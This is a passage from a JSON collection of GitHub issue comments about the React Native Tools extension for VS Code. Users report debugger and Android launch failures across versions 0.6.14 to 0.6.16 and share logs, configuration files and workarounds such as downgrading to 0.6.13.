-> node_modules\\native-base\\dist\\src\\basic\\Tabs\\DefaultTabBar.js -> node_modules\\native-base\\dist\\src\\index.js\n10-24 17:00:14.639  4578  4617 W ReactNativeJS: \n10-24 17:00:14.639  4578  4617 W ReactNativeJS: Require cycles are allowed, but can result in uninitialized values. Consider refactoring to remove the need for a cycle.\n[Info] 10-24 17:00:14.641  4578  4617 W ReactNativeJS: Require cycle: node_modules\\native-base\\dist\\src\\index.js -> node_modules\\native-base\\dist\\src\\basic\\Tabs\\index.js -> node_modules\\native-base\\dist\\src\\basic\\Tabs\\ScrollableTabBar.js -> node_modules\\native-base\\dist\\src\\index.js\n10-24 17:00:14.641  4578  4617 W ReactNativeJS: \n10-24 17:00:14.641  4578  4617 W ReactNativeJS: Require cycles are allowed, but can result in uninitialized values. Consider refactoring to remove the need for a cycle.\n[Info] 10-24 17:00:14.761  4578  4617 I ReactNativeJS: Running application \"tekcy\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\n``\nthe Developer Tools console can be seen in the following image:\n![capture](https://user-images.githubusercontent.com/13413278/47439084-6ac23e00-d7b4-11e8-8510-580d4bcd8e45.PNG)\n. > @reza7rm please copy output not from theLogCat-...channel, but fromReact-Native` one as shown on the following screen:\n\n\nHere's the photo\n\n. Thank you @aMarCruz . The problem was definitely the emulator cos when I connected my phone everything works fine, my phone has android 7 on it but the emulator I use is a pixel 2 API 27 with android 8.1 Oreo Image.\n. > @reza7rm do you have a chance to look at my comment? Just a friendly ping.\n\nreally sorry for not seeing your comment, was busy doing other stuff, and omg I don't believe that the Debug Remote Js was the issue! \nThank you very much. ",
    "edwardlafoy": "Running into the same issue. ",
    "AndrewBoklashko": "Same problem, wasted a lot of time with it today. ",
    "GiovanniFrigo": "Happens also on my mac, trying to run the same code as @FRizzonelli's . ",
    "tbsolutions": "Same issue. Guess it is related to the latest release (0.6.14) published today.. ",
    "vntguca": "Lost some hours on this issue today, simply stopped working for me too.\nI can confirm that RN-Tools 0.6.14 is the problem... downgrading to 0.6.13 works fine:\nWorkaround for downgrading:\n1.: Edit your VS Code's user setting to disable auto update by adding the following setting.\n\"extensions.autoUpdate\" : false,\n2.: Download the previous version of the RN-Tools extension from this URL\nhttps://ms-vscode.gallery.vsassets.io/_apis/public/gallery/publisher/vsmobile/extension/vscode-react-native/0.6.13/assetbyname/Microsoft.VisualStudio.Services.VSIXPackage\n3.: Rename from .VSIXPackage to .VSIX\n4.: In VS Code, press CTRL + SHIFT + P or (CMD+SHIFT+P) on Mac, then type VSIX\n5.:Enter the the Extension: install from VSIX command. This will launch a file picker windows.\n6.: Choose the VSIX file that you've just downloaded.\n7.: Reload VS code to enable the installed plug in.. Still no console output for me too on 0.6.15.. ",
    "abruyat": "same here! Can't debug my app since 0.6.14. Downgrading work\nReact-Native VS Code extension version: Latest\nVSCode version: Latest\nOS platform and version: Fedora 28\nNodeJS version: 10\nReact Native version: 0.56.0\nExpo SDK version (include if relevant):\n. ",
    "top-master": "just downgraded from 0.6.14 to 0.6.13 because of 777 and then downgraded from 0.6.13 to 0.6.12 because of the issue mentioned here but even 0.6.12 has that issue so I will need to wait for the next stable version. tested 0.6.15 and got below Debug Console output:\nOS: win32 ia32\nAdapter node: v7.9.0 ia32\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 42715\n******** Unhandled error in debug adapter - Unhandled promise rejection: Error: Cannot connect to runtime process, timeout after {_timeout} ms - (reason: {_error}).\n    at Object.runtimeConnectionTimeout (c:\\Program Files (x86)\\ide\\Microsoft VS Code\\resources\\app\\extensions\\ms-vscode.node-debug2\\node_modules\\vscode-chrome-debug-core\\out\\src\\errors.js:91:12)\n    at utils.retryAsync.catch.err (c:\\Program Files (x86)\\ide\\Microsoft VS Code\\resources\\app\\extensions\\ms-vscode.node-debug2\\node_modules\\vscode-chrome-debug-core\\out\\src\\chrome\\chromeConnection.js:100:49)\n    at <anonymous>\n    at process._tickCallback (internal/process/next_tick.js:109:7)\nand a long run-android output is visible in last edit of this comment. ",
    "Tilwin90": "While the idea of taking the path from local.properties sounds wonderful, it also doesn't work on Windows.\nFrom Android Studio I get the recommendation to set the path as follows: \nsdk.dir=C \\ : \\ \\ Users\\mihai.veres\\AppData\\Local\\Android\\Sdk (extra spaces added to emphasize the actual characters)\nHowever when the extension directly takes this path, it fails and signals that it cannot find the adb command (invalid path).\nAfter unescaping the path above I ran into the same issue as everyone else regarding not being able to find the \"simulator\" device. I am not trying to run this in a simulator, but on a physical device just like before.\nI also \"solved\" the problem by reverting to 0.6.13.. ",
    "xurenzhong": "update react-native-tools, same to me. now is 0.6.14\nI also \"solved\" the problem by reverting to 0.6.13.\n. ",
    "sdc395": "My target emulated device is named emulator-5554.  A step forward seems to be to add the following to .vscode/launch.json...\n        \"runArguments\": [\n            \"--deviceId\", \"emulator-5554\"\n        ]\n\nUnfortunately, this seems to cause both debug and release variants to be built.  My release build fails and so debugging doesn't start.. Thanks for the prompt response, @ruslan-bikkinin.  0.6.15 appears to fix the could not find device with the id: \"simulator\" problem but I don't get any debug console output from my app.  Reverting to 0.6.13 restores the console output.. ",
    "filmhomage": "\nStill no console output for me too on 0.6.15. \nReverting to 0.6.13 restores the console output.\n\nSame problem.. ",
    "kryptonian41": "I get the following error on the latest version of the extension, on running debug on android\nOS: win32 x64\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 34218\n******** Unhandled error in debug adapter: SyntaxError: Unexpected token L in JSON at position 0\n    at JSON.parse (<anonymous>)\n    at Pipe.channel.onread (internal/child_process.js:470:28)\nand also can anyone tell where can i see the console.log(), I am new to using this tool ?\nand this is my launch.json\n\"version\": \"0.2.0\",\n  \"configurations\": [\n    {\n      \"name\": \"Debug Android\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"android\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n      \"target\": \"c022be40\"\n    }. ",
    "msnikhil": "I installed the extension 3 days ago and faced the same issue mentioned by @Tilwin90  here in this comment thread. \nThen I uninstalled the extension but since then my react-native app builds successfully but doesn't open in debug mode. However, bundling in the release mode, the app opens successfully. More on this issue in my SO question here.\nI also created a new react-native project and pulled the working code of my app into the new RN project but still the issue persists. Interestingly, my other react-native apps open in the debug mode except for the one in which I installed this extension. Please help.. I found that the issue was not from the extension but from one of the packages in was using in the project. Updating the package to the latest version resolved my issue. Thank you for bearing with me :). ",
    "soeasyjx": "@ruslan-bikkinin . Let me try. I just want to debug in the android simulator, not in Expo.. I will prepare the demonstration project\uff0cplease wait \u3002. I think it will be caused by the project structure. I'll adjust the structure of the project\uff0c\nAndroid cannot move project structure\u3002\n@ruslan-bikkinin . ",
    "macaetano": "Exact same error here. Thx @Sterlingryan, that worked for me too. . @Sterlingryan, version 0.6.16 also seems to work fine. . ",
    "Sterlingryan": "https://github.com/Microsoft/vscode-react-native/issues/777#issuecomment-416426868 @macaetano  check this out, it worked for me. V0.6.16 fixed that, thank you @ruslan-bikkinin that was very fast . The latest update (0.6.17) produced a similar error as mentioned in this issue :\n[Error] Error: Error while executing command 'F\\:\\Programs\\Android\\sdk\\platform-tools\\adb devices': Command failed: F\\:\\Programs\\Android\\sdk\\platform-tools\\adb devices\nThe filename, directory name, or volume label syntax is incorrect.. React-Native: Run Android\n`[Warning] Target simulator is not supported for Android platform. If you want to use particular device or simulator for launching Android app, please specify  device id (as in 'adb devices' output) instead.\n[Info] Using Android SDK location defined in android/local.properties file: F\\:\\Programs\\Android\\sdk.\n[Info] Starting React Native Packager.\nScanning folders for symlinks in f:\\GitHub\\React Native Projects\\RentProfileAgents\\node_modules (67ms)\nBuilding and installing the app on the device (cd android && gradlew.bat installDebug)...\nWARNING: The option 'android.enableAapt2' is deprecated and should not be used anymore.\nUse 'android.enableAapt2=true' to remove this warning.\nIt will be removed at the end of 2018..\nWARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'.\nIt will be removed at the end of 2018. For more information see: http://d.android.com/r/tools/update-dependency-configurations.html\nWARNING: The option 'android.enableAapt2' is deprecated and should not be used anymore.\nUse 'android.enableAapt2=true' to remove this warning.\nIt will be removed at the end of 2018..\nWARNING: The option 'android.enableAapt2' is deprecated and should not be used anymore.\nUse 'android.enableAapt2=true' to remove this warning.\nIt will be removed at the end of 2018..\nWARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'.\nIt will be removed at the end of 2018. For more information see: http://d.android.com/r/tools/update-dependency-configurations.html\nWARNING: The option 'android.enableAapt2' is deprecated and should not be used anymore.\nUse 'android.enableAapt2=true' to remove this warning.\nIt will be removed at the end of 2018..\nWARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'.\nIt will be removed at the end of 2018. For more information see: http://d.android.com/r/tools/update-dependency-configurations.html\nWARNING: The option 'android.enableAapt2' is deprecated and should not be used anymore.\nUse 'android.enableAapt2=true' to remove this warning.\nIt will be removed at the end of 2018..\nWARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'.\nIt will be removed at the end of 2018. For more information see: http://d.android.com/r/tools/update-dependency-configurations.html\n:app:preBuild UP-TO-DATE\n:react-native-camera:preBuild UP-TO-DATE\n:react-native-camera:preDebugBuild UP-TO-DATE\n:react-native-camera:checkDebugManifest UP-TO-DATE\n:react-native-camera:processDebugManifest UP-TO-DATE\n:react-native-image-resizer:preBuild UP-TO-DATE\n:react-native-image-resizer:preDebugBuild UP-TO-DATE\n:react-native-image-resizer:checkDebugManifest UP-TO-DATE\n:react-native-image-resizer:processDebugManifest UP-TO-DATE\n:react-native-securerandom:preBuild UP-TO-DATE\n:react-native-securerandom:preDebugBuild UP-TO-DATE\n:react-native-securerandom:checkDebugManifest UP-TO-DATE\n:react-native-securerandom:processDebugManifest UP-TO-DATE\n:react-native-vector-icons:preBuild UP-TO-DATE\n:react-native-vector-icons:preDebugBuild UP-TO-DATE\n:react-native-vector-icons:checkDebugManifest UP-TO-DATE\n:react-native-vector-icons:processDebugManifest UP-TO-DATE\n:app:preDebugBuild UP-TO-DATE\n:react-native-camera:compileDebugAidl UP-TO-DATE\n:react-native-image-resizer:compileDebugAidl UP-TO-DATE\n:react-native-securerandom:compileDebugAidl UP-TO-DATE\n:react-native-vector-icons:compileDebugAidl UP-TO-DATE\n:app:compileDebugAidl UP-TO-DATE\n:react-native-camera:packageDebugRenderscript NO-SOURCE\n:react-native-image-resizer:packageDebugRenderscript NO-SOURCE\n:react-native-securerandom:packageDebugRenderscript NO-SOURCE\n:react-native-vector-icons:packageDebugRenderscript NO-SOURCE\n:app:compileDebugRenderscript UP-TO-DATE\n:app:checkDebugManifest UP-TO-DATE\n:app:generateDebugBuildConfig UP-TO-DATE\n:app:prepareLintJar UP-TO-DATE\n:app:mergeDebugShaders UP-TO-DATE\n:app:compileDebugShaders UP-TO-DATE\n:app:generateDebugAssets UP-TO-DATE\n:react-native-camera:mergeDebugShaders UP-TO-DATE\n:react-native-camera:compileDebugShaders UP-TO-DATE\n:react-native-camera:generateDebugAssets UP-TO-DATE\n:react-native-camera:packageDebugAssets UP-TO-DATE\n:react-native-image-resizer:mergeDebugShaders UP-TO-DATE\n:react-native-image-resizer:compileDebugShaders UP-TO-DATE\n:react-native-image-resizer:generateDebugAssets UP-TO-DATE\n:react-native-image-resizer:packageDebugAssets UP-TO-DATE\n:react-native-securerandom:mergeDebugShaders UP-TO-DATE\n:react-native-securerandom:compileDebugShaders UP-TO-DATE\n:react-native-securerandom:generateDebugAssets UP-TO-DATE\n:react-native-securerandom:packageDebugAssets UP-TO-DATE\n:react-native-vector-icons:mergeDebugShaders UP-TO-DATE\n:react-native-vector-icons:compileDebugShaders UP-TO-DATE\n:react-native-vector-icons:generateDebugAssets UP-TO-DATE\n:react-native-vector-icons:packageDebugAssets UP-TO-DATE\n:app:mergeDebugAssets UP-TO-DATE\n:app:generateDebugResValues UP-TO-DATE\n:app:generateDebugResources UP-TO-DATE\n:react-native-camera:compileDebugRenderscript UP-TO-DATE\n:react-native-camera:generateDebugResValues UP-TO-DATE\n:react-native-camera:generateDebugResources UP-TO-DATE\n:react-native-camera:packageDebugResources UP-TO-DATE\n:react-native-image-resizer:compileDebugRenderscript UP-TO-DATE\n:react-native-image-resizer:generateDebugResValues UP-TO-DATE\n:react-native-image-resizer:generateDebugResources UP-TO-DATE\n:react-native-image-resizer:packageDebugResources UP-TO-DATE\n:react-native-securerandom:compileDebugRenderscript UP-TO-DATE\n:react-native-securerandom:generateDebugResValues UP-TO-DATE\n:react-native-securerandom:generateDebugResources UP-TO-DATE\n:react-native-securerandom:packageDebugResources UP-TO-DATE\n:react-native-vector-icons:compileDebugRenderscript UP-TO-DATE\n:react-native-vector-icons:generateDebugResValues UP-TO-DATE\n:react-native-vector-icons:generateDebugResources UP-TO-DATE\n:react-native-vector-icons:packageDebugResources UP-TO-DATE\n:app:mergeDebugResources UP-TO-DATE\n:app:bundleDebugJsAndAssets SKIPPED\n:app:copyDebugIconFonts UP-TO-DATE\n:app:mainApkListPersistenceDebug UP-TO-DATE\n:app:createDebugCompatibleScreenManifests UP-TO-DATE\n:app:processDebugManifest UP-TO-DATE\n:app:splitsDiscoveryTaskDebug UP-TO-DATE\n:react-native-camera:platformAttrExtractor UP-TO-DATE\n:react-native-camera:generateDebugRFile UP-TO-DATE\n:react-native-image-resizer:platformAttrExtractor UP-TO-DATE\n:react-native-image-resizer:generateDebugRFile UP-TO-DATE\n:react-native-securerandom:platformAttrExtractor UP-TO-DATE\n:react-native-securerandom:generateDebugRFile UP-TO-DATE\n:react-native-vector-icons:platformAttrExtractor UP-TO-DATE\n:react-native-vector-icons:generateDebugRFile UP-TO-DATE\n:app:processDebugResources UP-TO-DATE\n:app:generateDebugSources UP-TO-DATE\n:react-native-camera:generateDebugBuildConfig UP-TO-DATE\n:react-native-camera:prepareLintJar UP-TO-DATE\n:react-native-camera:generateDebugSources UP-TO-DATE\n:react-native-camera:javaPreCompileDebug UP-TO-DATE\n:react-native-camera:compileDebugJavaWithJavac UP-TO-DATE\n:react-native-camera:processDebugJavaRes NO-SOURCE\n:react-native-camera:transformClassesAndResourcesWithPrepareIntermediateJarsForDebug UP-TO-DATE\n:react-native-image-resizer:generateDebugBuildConfig UP-TO-DATE\n:react-native-image-resizer:prepareLintJar UP-TO-DATE\n:react-native-image-resizer:generateDebugSources UP-TO-DATE\n:react-native-image-resizer:javaPreCompileDebug UP-TO-DATE\n:react-native-image-resizer:compileDebugJavaWithJavac UP-TO-DATE\n:react-native-image-resizer:processDebugJavaRes NO-SOURCE\n:react-native-image-resizer:transformClassesAndResourcesWithPrepareIntermediateJarsForDebug UP-TO-DATE\n:react-native-securerandom:generateDebugBuildConfig UP-TO-DATE\n:react-native-securerandom:prepareLintJar UP-TO-DATE\n:react-native-securerandom:generateDebugSources UP-TO-DATE\n:react-native-securerandom:javaPreCompileDebug UP-TO-DATE\n:react-native-securerandom:compileDebugJavaWithJavac UP-TO-DATE\n:react-native-securerandom:processDebugJavaRes NO-SOURCE\n:react-native-securerandom:transformClassesAndResourcesWithPrepareIntermediateJarsForDebug UP-TO-DATE\n:react-native-vector-icons:generateDebugBuildConfig UP-TO-DATE\n:react-native-vector-icons:prepareLintJar UP-TO-DATE\n:react-native-vector-icons:generateDebugSources UP-TO-DATE\n:react-native-vector-icons:javaPreCompileDebug UP-TO-DATE\n:react-native-vector-icons:compileDebugJavaWithJavac UP-TO-DATE\n:react-native-vector-icons:processDebugJavaRes NO-SOURCE\n:react-native-vector-icons:transformClassesAndResourcesWithPrepareIntermediateJarsForDebug UP-TO-DATE\n:app:javaPreCompileDebug UP-TO-DATE\n:app:compileDebugJavaWithJavac UP-TO-DATE\n:app:compileDebugNdk NO-SOURCE\n:app:compileDebugSources UP-TO-DATE\n:app:transformClassesWithDexBuilderForDebug UP-TO-DATE\n:app:transformClassesWithMultidexlistForDebug UP-TO-DATE\n:app:transformDexArchiveWithDexMergerForDebug UP-TO-DATE\n:app:mergeDebugJniLibFolders UP-TO-DATE\n:react-native-camera:compileDebugNdk NO-SOURCE\n:react-native-camera:mergeDebugJniLibFolders UP-TO-DATE\n:react-native-camera:transformNativeLibsWithMergeJniLibsForDebug UP-TO-DATE\n:react-native-camera:transformNativeLibsWithIntermediateJniLibsForDebug UP-TO-DATE\n:react-native-image-resizer:compileDebugNdk NO-SOURCE\n:react-native-image-resizer:mergeDebugJniLibFolders UP-TO-DATE\n:react-native-image-resizer:transformNativeLibsWithMergeJniLibsForDebug UP-TO-DATE\n:react-native-image-resizer:transformNativeLibsWithIntermediateJniLibsForDebug UP-TO-DATE\n:react-native-securerandom:compileDebugNdk NO-SOURCE\n:react-native-securerandom:mergeDebugJniLibFolders UP-TO-DATE\n:react-native-securerandom:transformNativeLibsWithMergeJniLibsForDebug UP-TO-DATE\n:react-native-securerandom:transformNativeLibsWithIntermediateJniLibsForDebug UP-TO-DATE\n:react-native-vector-icons:compileDebugNdk NO-SOURCE\n:react-native-vector-icons:mergeDebugJniLibFolders UP-TO-DATE\n:react-native-vector-icons:transformNativeLibsWithMergeJniLibsForDebug UP-TO-DATE\n:react-native-vector-icons:transformNativeLibsWithIntermediateJniLibsForDebug UP-TO-DATE\n:app:transformNativeLibsWithMergeJniLibsForDebug UP-TO-DATE\n:app:processDebugJavaRes NO-SOURCE\n:app:transformResourcesWithMergeJavaResForDebug UP-TO-DATE\n:app:validateSigningDebug UP-TO-DATE\n:app:packageDebug UP-TO-DATE\n:app:assembleDebug UP-TO-DATE\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Pixel_2(AVD) - 8.0.0' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL in 4s\n104 actionable tasks: 1 executed, 103 up-to-date\nRunning adb -s emulator-5554 reverse tcp:8081 tcp:8081\nStarting the app on emulator-5554 (adb -s emulator-5554 shell am start -n com.rentprofileagents/com.rentprofileagents.MainActivity)...\nStarting: Intent { cmp=com.rentprofileagents/.MainActivity }\n`\nlocal.properties\nsdk.dir=F\\:\\\\Programs\\\\Android\\\\sdk\n. It runs fine if I downgrade the extension to 0.6.13. Yep you're right. hi @ruslan-bikkinin , I can confirm that it does exist. That was the error, I have upgraded to Android Studio 3.3 and it was giving the sdk path with an extra space. Thanks for the help :).. That was the error, I have upgraded to Android Studio 3.3 and it was giving the sdk path with an extra space. Thanks for the help :).. ",
    "federicot": "It happens to me too. But I do get an error the first time I click stop.\nError processing \"terminate\": Error: kill ESRCH\n    at Object._errnoException (util.js:1024:11)\n    at process.kill (internal/process.js:183:18)\n    at Object.<anonymous> (/Users/federicot/.vscode/extensions/ms-vscode.node-debug2-1.27.1/out/src/nodeDebugAdapter.js:466:25)\n    at Generator.next (<anonymous>)\n    at /Users/federicot/.vscode/extensions/ms-vscode.node-debug2-1.27.1/out/src/nodeDebugAdapter.js:10:71\n    at new Promise (<anonymous>)\n    at __awaiter (/Users/federicot/.vscode/extensions/ms-vscode.node-debug2-1.27.1/out/src/nodeDebugAdapter.js:6:12)\n    at Object.terminate (/Users/federicot/.vscode/extensions/ms-vscode.node-debug2-1.27.1/out/src/nodeDebugAdapter.js:461:16)\n    at Object.dispatchRequest (/Users/federicot/.vscode/extensions/vsmobile.vscode-react-native-0.6.16/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugSession.js:75:82)\n    at Object.dispatchRequest (/Users/federicot/.vscode/extensions/vsmobile.vscode-react-native-0.6.16/src/debugger/nodeDebugWrapper.js:50:26)\nVisual Studio Code: 1.26.1\nReact Native Tools: 0.6.16\nNode: 8.11.3. ",
    "zenz": "It seems that the plugin cannot correctly detect if the project is an Expo project or not.. ",
    "aidanw": "Apologies for barging into a closed issue...\nIs there an imminent release with this fix, or is it possible for me to roll my own extension direct from master (I know nothing about the way VSCode extensions work!)?\n. No, but if you start the packager in a command line (react-native start) then you can do 'run Android' from within vscode and it uses the started packager. \nIt gets confused sometimes but then I just kill and restart the command line.\n. ",
    "direwolf424": "@aidanw Did you find any solution to build the extension from master directly? . ",
    "edzillion": "Hi @ruslan-bikkinin thanks for the quick response. \nYep, that's the app, and you can use the master (that is what I am working against).\nI just tried on my ubuntu 18.04.1 laptop and have identical results. I notice that, similar to the issue described here, I do not have a .react directory in my .vscode directory:\nReact Native - Debug adapter process has terminated unexpectedly. Tested tonight on a friends OSX 10.13.6 laptop and had same problem. . Hi @iTOYS I think this will need reopening:\n\"react-native\": \"^0.57.0\",:\n```\n[Info] Making sure your project uses the correct dependencies for exponent. This may take a while...\nChecking if this is Expo app......\n[Info] Starting Packager\nerror: unknown option `--root'\n[Error] Error: Could not start the packager.\n```\n\"react-native\": \"0.55.4\",: same behaviour, works but not stopping on breakpoints\nRunning application \"main\" with appParams: {\"initialProps\":{\"exp\":{\"initialUri\":\"exp://yf-nvm.edzillion.circles-mobile.exp.direct:80\",\"manifest\":{\"isVerified\":true,\"hostUri\":\"yf-nvm.edzillion.circles-mobile.exp.direct:80\",\"version\":\"0.1.0\",\"slug\":\"circles-mobile\",\"name\":\"Circles\",\"xde\":true,\"sdkVersion\":\"27.0.0\",\"id\":\"@edzillion/circles-mobile\",\"mainModuleName\":\"./node_modules/react-native-scripts/build/bin/crna-entry\",\"packagerOpts\":{\"dev\":true,\"lanType\":\"ip\",\"hostType\":\"tunnel\",\"minify\":false,\"urlRandomness\":\"yf-nvm\"},\"ios\":{\"bundleIdentifier\":\"com.circlesorg.circles\"},\"bundleUrl\":\"http://packager.yf-nvm.edzillion.circles-mobile.exp.direct:80/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=android&dev=true&minify=false&hot=false&assetPlugin=e%3A%5Cdev%5Ccircles%5Ccircles-mobile%5Cnode_modules%5Cexpo%5Ctools%5ChashAssetFiles\",\"orientation\":\"default\",\"primaryColor\":\"#023C69\",\"logUrl\":\"http://yf-nvm.edzillion.circles-mobile.exp.direct:80/logs\",\"loadedFromCache\":false,\"icon\":\"./images/appicon.png\",\"env\":{},\"debuggerHost\":\"packager.yf-nvm.edzillion.circles-mobile.exp.direct:80\",\"iconUrl\":\"http://packager.yf-nvm.edzillion.circles-mobile.exp.direct:80/assets/./images/appicon.png\",\"developer\":{\"projectRoot\":\"e:\\\\dev\\\\circles\\\\circles-mobile\"}},\"shell\":false}},\"rootTag\":1}. __DEV__ === true, development-level warning are ON, performance optimizations are OFFRunning application \"main\" with appParams: {\"initialProps\":{\"exp\":{\"initialUri\":\"exp://yf-nvm.edzillion.circles-mobile.exp.direct:80\",\"manifest\":{\"isVerified\":true,\"hostUri\":\"yf-nvm.edzillion.circles-mobile.exp.direct:80\",\"version\":\"0.1.0\",\"slug\":\"circles-mobile\",\"name\":\"Circles\",\"xde\":true,\"sdkVersion\":\"27.0.0\",\"id\":\"@edzillion/circles-mobile\",\"mainModuleName\":\"./node_modules/react-native-scripts/build/bin/crna-entry\",\"packagerOpts\":{\"dev\":true,\"lanType\":\"ip\",\"hostType\":\"tunnel\",\"minify\":false,\"urlRandomness\":\"yf-nvm\"},\"ios\":{\"bundleIdentifier\":\"com.circlesorg.circles\"},\"bundleUrl\":\"http://packager.yf-nvm.edzillion.circles-mobile.exp.direct:80/./node_modules/react-native-scripts/build/bin/crna-entry.bundle?platform=android&dev=true&minify=false&hot=false&assetPlugin=e%3A%5Cdev%5Ccircles%5Ccircles-mobile%5Cnode_modules%5Cexpo%5Ctools%5ChashAssetFiles\",\"orientation\":\"default\",\"primaryColor\":\"#023C69\",\"logUrl\":\"http://yf-nvm.edzillion.circles-mobile.exp.direct:80/logs\",\"loadedFromCache\":false,\"icon\":\"./images/appicon.png\",\"env\":{},\"debuggerHost\":\"packager.yf-nvm.edzillion.circles-mobile.exp.direct:80\",\"iconUrl\":\"http://packager.yf-nvm.edzillion.circles-mobile.exp.direct:80/assets/./images/appicon.png\",\"developer\":{\"projectRoot\":\"e:\\\\dev\\\\circles\\\\circles-mobile\"}},\"shell\":false}},\"rootTag\":1}. __DEV__ === true, development-level warning are ON, performance optimizations are OFF. also FYI I have tried both 'Debug in Exponent' which connects like:\nexp://yf-nvm.edzillion.circles-mobile.exp.direct:80\nand running via cli and then 'Attach to packager' which connects via\nexp://192.168.0.1:19000\nboth run fine with no errors but do not stop on breakpoints or exceptions.. tbh I am a little unsure of this point. \nI have them inside all the onPress() handlers (line 149, 160 & 168) e.g:\n149:         this.props.navigation.push('Terms')\nin SplashScreen.js. added some more in App.js\n61:    await Font.loadAsync({\nand\n71:     return this.state.loading\n. I previously tried removing the .vscode directory and recreating from scratch. These are my current settings\n{\n  // Use IntelliSense to learn about possible attributes.\n  // Hover to view descriptions of existing attributes.\n  // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n  \"version\": \"0.2.0\",\n  \"configurations\": [\n    {\n      \"name\": \"Debug Android\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"android\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n      \"name\": \"Debug iOS\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"ios\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n      \"name\": \"Attach to packager\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"attach\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n      \"name\": \"Debug in Exponent\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"exponent\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    }\n  ]\n}\nsettings.json: \n{\n  \"hostType\": \"tunnel\",\n  \"lanType\": \"ip\",\n  \"dev\": true,\n  \"minify\": false,\n  \"urlRandomness\": \"yf-nvm\"\n}\n. is that the lot? here's my packager-info.json too:\n{\n  \"expoServerPort\": 19000,\n  \"packagerPort\": 8081,\n  \"packagerPid\": null,\n  \"expoServerNgrokUrl\": \"https://yf-nvm.edzillion.circles-mobile.exp.direct\",\n  \"packagerNgrokUrl\": \"https://packager.yf-nvm.edzillion.circles-mobile.exp.direct\",\n  \"ngrokPid\": 127976\n}. I am using an android device\nbtw. are you getting issues with npm today? Seems fine until I try to install the exp or expo-cli package (I am trying to set up a new project to test that). > \n\nCould you please try to delete node_modules folder and reinstall it.\n\nOk, just did that. No change.. I just set up a new app via create-react-native-app and set breakpoints and exceptions. Still wont bring up the debug UI and wont stop on breakpoints etc.\nhere's the package.json:\n{\n  \"name\": \"circles-admin-rn\",\n  \"version\": \"0.1.0\",\n  \"private\": true,\n  \"devDependencies\": {\n    \"react-native-scripts\": \"1.14.0\",\n    \"jest-expo\": \"~27.0.0\",\n    \"react-test-renderer\": \"16.3.1\"\n  },\n  \"main\": \"./node_modules/react-native-scripts/build/bin/crna-entry.js\",\n  \"scripts\": {\n    \"start\": \"react-native-scripts start\",\n    \"eject\": \"react-native-scripts eject\",\n    \"android\": \"react-native-scripts android\",\n    \"ios\": \"react-native-scripts ios\",\n    \"test\": \"jest\"\n  },\n  \"jest\": {\n    \"preset\": \"jest-expo\"\n  },\n  \"dependencies\": {\n    \"expo\": \"^27.0.1\",\n    \"react\": \"16.3.1\",\n    \"react-native\": \"~0.55.2\"\n  }\n}. Goddammit! that's it.\nThanks and sorry for wasting your time.. ",
    "jlubeck": "You should really include that small part in the documentation! (selecting Debug Remote JS). I'm having the same issue but when developing on iPhone on a Mac. Launching the debugger starts the app. If I change code, it refreshes the JS bundle. But the Debugger never connects and it just loads forever.... I got it fixed by this: https://github.com/Microsoft/vscode-react-native/issues/793. ",
    "nagnihotri": "every time I create a fresh react native app it works for some times from CMD npm run android and after few successful runs it is throwing this error. however vscode never runs it successful if I choose React native: run android simulator \nUnknown error: not all success patterns were matched. It means that \"react-native run-android\" command failed. Please, check the View -> Toggle Output -> React Native, View -> Toggle Output -> React Native: Run android output windows.. Hello @ruslan-bikkinin Yes I did check and that will take you to the error what I posted as question. . This issue actually never resolved and developers have been struggling with this issue, like this https://github.com/Microsoft/vscode-react-native/issues/624#issuecomment-384942115\nPlease dont close this issue and lets try to fix this now with proper steps and global resolution. . Sure @ruslan-bikkinin \nError:\nStack: Error: Failed to run the application in Android: Unknown error: not all success patterns were matched.\nat Function.getWrappedError (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\src\\common\\error\\internalError.js:35:16)\nat Function.wrapError (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\src\\common\\error\\errorHelper.js:18:44)\nat resultOfCode.done.reason (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\src\\common\\entryPointHandler.js:43:72)\nat _rejected (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:844:24)\nat C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:870:30\nat Promise.when 